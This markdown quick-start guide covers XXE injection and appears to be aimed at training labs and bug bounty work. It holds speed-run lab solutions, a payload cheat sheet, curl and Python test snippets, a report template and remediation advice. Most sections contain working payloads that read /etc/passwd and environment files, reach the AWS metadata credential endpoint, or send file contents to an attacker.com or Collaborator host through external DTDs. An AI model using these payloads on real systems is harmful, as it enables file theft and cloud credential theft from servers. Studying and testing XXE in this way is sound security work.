# XXE Injection - Quick Start Guide

## 60-Second XXE Check

```bash
# 1. Identify XML endpoint
# 2. Inject basic payload
# 3. Check response

# Basic test payload:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>
```

---

## Lab Speed-Run Guides

### Lab 1: Basic File Retrieval (2 minutes)

**Payload:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Steps:**
1. Product page → "Check stock" → Intercept
2. Insert DOCTYPE before `<stockCheck>`
3. Replace `<productId>1</productId>` with `<productId>&xxe;</productId>`
4. ✅ Done - `/etc/passwd` in response

---

### Lab 2: SSRF via XXE (3 minutes)

**Final Payload:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Speed steps:**
1. Intercept stock check
2. Use payload above (no enumeration needed!)
3. Copy `SecretAccessKey` from response
4. Submit solution
5. ✅ Done

**Enumeration (if needed):**
```
/ → latest/ → meta-data/ → iam/ → security-credentials/ → admin
```

---

### Lab 3: Blind XXE Out-of-Band (2 minutes)

**Payload:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR.net"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Steps:**
1. Burp → Collaborator client → Copy to clipboard
2. Intercept stock check → Inject payload with your Collaborator domain
3. Send request
4. Collaborator tab → Poll now
5. ✅ Done - DNS/HTTP interaction received

---

### Lab 4: Parameter Entities (2 minutes)

**Payload:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR.net"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Key difference:** `%xxe;` instead of `&xxe;` + no reference in XML content

**Steps:**
1. Same as Lab 3 but use parameter entity syntax
2. Note `%xxe;` is invoked in DOCTYPE, not in `<productId>`
3. ✅ Done - Collaborator receives interaction

---

### Lab 5: Blind XXE Data Exfiltration (5 minutes)

**Exploit server DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR.net/?x=%file;'>">
%eval;
%exfil;
```

**Main payload:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER.net/exploit"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Steps:**
1. Get Collaborator domain
2. Exploit server → Body → Paste DTD (with Collaborator domain)
3. Store exploit → Copy exploit URL
4. Intercept stock check → Inject payload with exploit URL
5. Collaborator → Poll now → Extract hostname from `?x=` parameter
6. Submit solution
7. ✅ Done

---

### Lab 6: Error-Based XXE (4 minutes)

**Exploit server DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

**Main payload:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER.net/exploit"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Steps:**
1. Exploit server → Paste error-based DTD
2. Store → Copy URL
3. Inject payload → Send
4. `/etc/passwd` appears in error message
5. ✅ Done

---

### Lab 7: XInclude (2 minutes)

**Payload (URL-encoded):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Steps:**
1. Intercept stock check (note: it's form data, not XML!)
2. Replace `productId` parameter value with payload
3. Burp will auto-encode
4. ✅ Done - `/etc/passwd` in response

**Manual URL encoding:**
```
productId=%3Cfoo%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20parse%3D%22text%22%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2F%3E%3C%2Ffoo%3E
```

---

### Lab 8: XXE via File Upload (3 minutes)

**exploit.svg:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Steps:**
1. Create `exploit.svg` file locally
2. Blog post → Comment section → Upload as avatar
3. Submit comment
4. View page → Avatar displays hostname
5. Copy hostname → Submit solution
6. ✅ Done

---

### Lab 9: Local DTD Repurposing (5 minutes)

**Payload:**
```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Steps:**
1. Intercept stock check
2. Paste complete payload (replace entire body)
3. Error message contains `/etc/passwd`
4. ✅ Done

---

## Common Payloads Cheat Sheet

### File Retrieval

**Linux:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
```

**Windows:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
```

### SSRF

**AWS Metadata:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
```

**Internal Services:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/config"> ]>
```

### Blind XXE

**Out-of-Band:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
```

**Data Exfiltration (external DTD):**
```xml
<!-- Main payload -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Error-Based (external DTD):**
```xml
<!-- Main payload -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>

<!-- error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

### XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="16">&xxe;</text>
</svg>
```

---

## Burp Suite Quick Workflow

### Setup (30 seconds)

1. **Proxy:** Ensure listener active (127.0.0.1:8080)
2. **Browser:** Configure proxy settings
3. **Collaborator:** Burp → Collaborator client → Copy to clipboard

### Testing (2 minutes)

1. **Identify:** Proxy → HTTP history → Filter: XML
2. **Test:** Right-click request → Send to Repeater
3. **Inject:** Add DOCTYPE + entity
4. **Verify:** Check response or Collaborator

### Automation (Burp Pro)

1. **Scan:** Right-click target → "Scan"
2. **Wait:** Scanner detects XXE automatically
3. **Review:** Dashboard → Issues → XML External Entity

---

## Detection Checklist

**Quick checks:**

- [ ] Application accepts XML input
- [ ] `Content-Type: application/xml` or `text/xml`
- [ ] SOAP web service
- [ ] File upload accepts SVG/DOCX/XML
- [ ] Import/export functionality with XML
- [ ] API endpoints with XML bodies
- [ ] RSS/Atom feed parsing

**Test each with:**
1. Basic file read payload
2. Blind XXE with Collaborator
3. XInclude (if can't control DOCTYPE)
4. File upload (SVG) if applicable

---

## Common Mistakes to Avoid

| ❌ Wrong | ✅ Correct |
|---------|-----------|
| `file://etc/passwd` | `file:///etc/passwd` (3 slashes) |
| `&xxe` (no semicolon) | `&xxe;` |
| Using `%xxe;` in XML content | `%xxe;` only in DTD, `&xxe;` in content |
| Forgetting DOCTYPE | Must define entity in DOCTYPE first |
| Not polling Collaborator | Click "Poll now" to see interactions |

---

## When Each Technique Works

```
┌─────────────────────────────────────────────────┐
│ Direct output visible?                          │
│ YES → Basic XXE (Labs 1-2)                      │
│                                                 │
│ NO → Blind XXE ↓                                │
└─────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────┐
│ Outbound connections allowed?                   │
│ YES → Out-of-Band (Labs 3-5)                    │
│                                                 │
│ NO → Error-based ↓                              │
└─────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────┐
│ External DTD loading allowed?                   │
│ YES → Error-based with external DTD (Lab 6)     │
│                                                 │
│ NO → Local DTD repurposing (Lab 9)              │
└─────────────────────────────────────────────────┘

Special cases:
├─ Can't control DOCTYPE? → XInclude (Lab 7)
└─ File upload? → SVG/DOCX XXE (Lab 8)
```

---

## Troubleshooting Quick Fixes

**No response:**
- Try blind XXE with Collaborator
- Check error messages
- Try XInclude instead

**Collaborator no interaction:**
- Wait 10 seconds, then poll
- Try parameter entities
- Check firewall rules
- Use error-based technique

**Special characters breaking payload:**
- Use PHP filter: `php://filter/convert.base64-encode/resource=/etc/passwd`
- Target simpler files: `/etc/hostname`

**Parser restrictions:**
- Try different entity types (general vs parameter)
- Use XInclude
- Test local DTD repurposing

---

## Top 10 XXE Testing Tips

1. **Always test blind XXE** - Most XXE is blind in the wild
2. **Use Collaborator** - Essential for blind detection
3. **Start simple** - Basic payload first, then complex
4. **Check file uploads** - SVG/DOCX often overlooked
5. **Test parameter entities** - Bypass entity restrictions
6. **Look for SOAP** - Web services commonly vulnerable
7. **Try XInclude** - Works when DOCTYPE control limited
8. **Read small files** - `/etc/hostname` better than `/etc/passwd`
9. **Monitor errors** - Error messages leak data
10. **Document everything** - Reproduction crucial for reports

---

## Quick Command Reference

### Test with curl

```bash
# Basic XXE test
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Blind XXE test
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><root>&xxe;</root>'
```

### Python XXE tester

```python
import requests

payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>'''

response = requests.post(
    'https://target.com/api',
    headers={'Content-Type': 'application/xml'},
    data=payload
)

print(response.text)
```

---

## Risk Assessment Quick Reference

### Severity Ratings

| Impact | CVSS | Description |
|--------|------|-------------|
| **Critical** | 9.0-10.0 | Remote code execution, full system compromise |
| **High** | 7.0-8.9 | File read, SSRF to metadata, credential theft |
| **Medium** | 4.0-6.9 | Limited file read, internal network discovery |
| **Low** | 0.1-3.9 | XXE present but difficult to exploit |

### Quick Impact Assessment

**File Read XXE:**
- `/etc/passwd` access = **High**
- `/etc/hostname` only = **Medium**
- Application files with credentials = **Critical**

**SSRF via XXE:**
- Cloud metadata access = **Critical**
- Internal network scan = **High**
- Localhost access = **Medium-High**

**Blind XXE:**
- Confirmed interaction = **Medium** (potential High/Critical)
- Data exfiltration working = **High-Critical**

---

## 5-Minute Bug Bounty Workflow

**Step 1: Identify (30 sec)**
- Find XML endpoints
- Check file uploads (SVG)
- Look for SOAP services

**Step 2: Test Basic (1 min)**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
```

**Step 3: Test Blind (1 min)**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe; ]>
```

**Step 4: Try XInclude (1 min)**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Step 5: Document & Report (1.5 min)**
- Screenshot of `/etc/passwd` or Collaborator interaction
- Describe impact (file read, SSRF, etc.)
- Provide remediation advice
- Submit report

---

## Report Template (1 minute)

```markdown
# XXE Injection Vulnerability

**Severity:** High

**Endpoint:** POST /api/endpoint

**Payload:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

**Proof of Concept:**
[Screenshot showing /etc/passwd contents]

**Impact:**
- Arbitrary file read from server filesystem
- Potential SSRF to internal services
- Risk of credential theft and system compromise

**Remediation:**
Disable external entity processing in XML parser:
- Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
- PHP: `libxml_disable_entity_loader(true)`
- Python: `XMLParser(resolve_entities=False)`

**References:**
- OWASP XXE Prevention Cheat Sheet
- CWE-611: Improper Restriction of XML External Entity Reference
```

---

## Speed Testing Summary

| Lab | Time | Key Payload |
|-----|------|-------------|
| 1 - Basic | 2 min | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| 2 - SSRF | 3 min | `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` |
| 3 - Blind OOB | 2 min | `<!ENTITY xxe SYSTEM "http://COLLAB">` |
| 4 - Parameter | 2 min | `<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;` |
| 5 - Exfiltration | 5 min | External DTD with file read + exfil |
| 6 - Error-based | 4 min | External DTD with invalid path |
| 7 - XInclude | 2 min | `<xi:include parse="text" href="file:///etc/passwd"/>` |
| 8 - File Upload | 3 min | SVG with XXE payload |
| 9 - Local DTD | 5 min | Repurpose `/usr/share/yelp/dtd/docbookx.dtd` |

**Total time for all 9 labs:** ~28 minutes

---

## Essential Burp Suite Shortcuts

- `Ctrl+R` - Send to Repeater
- `Ctrl+I` - Send to Intruder
- `Ctrl+Shift+B` - Base64 encode
- `Ctrl+Shift+U` - URL encode
- `Ctrl+Space` - Send request (in Repeater)

**Collaborator workflow:**
1. `Alt+B` → Burp menu
2. `Alt+C` → Collaborator client
3. Click "Copy to clipboard"
4. Poll with "Poll now" button

---

## Quick Win Checklist for Bug Bounties

- [ ] Test all XML endpoints with basic XXE
- [ ] Check SVG upload functionality
- [ ] Look for DOCX/XLSX import features
- [ ] Test SOAP web services
- [ ] Try XInclude on data parameters
- [ ] Test blind XXE with Collaborator
- [ ] Check RSS/Atom feed parsing
- [ ] Test API endpoints with XML
- [ ] Look for config import/export
- [ ] Test XML-based authentication (SAML)

**High-value targets:**
- Admin panels with XML import
- File upload with image processing
- API endpoints with SOAP/XML-RPC
- Document processing features
- Email/calendar import (vCard, iCal)

---

**Quick Start Version:** 1.0
**Last Updated:** 2026-01-09
**For:** Rapid XXE testing and lab completion
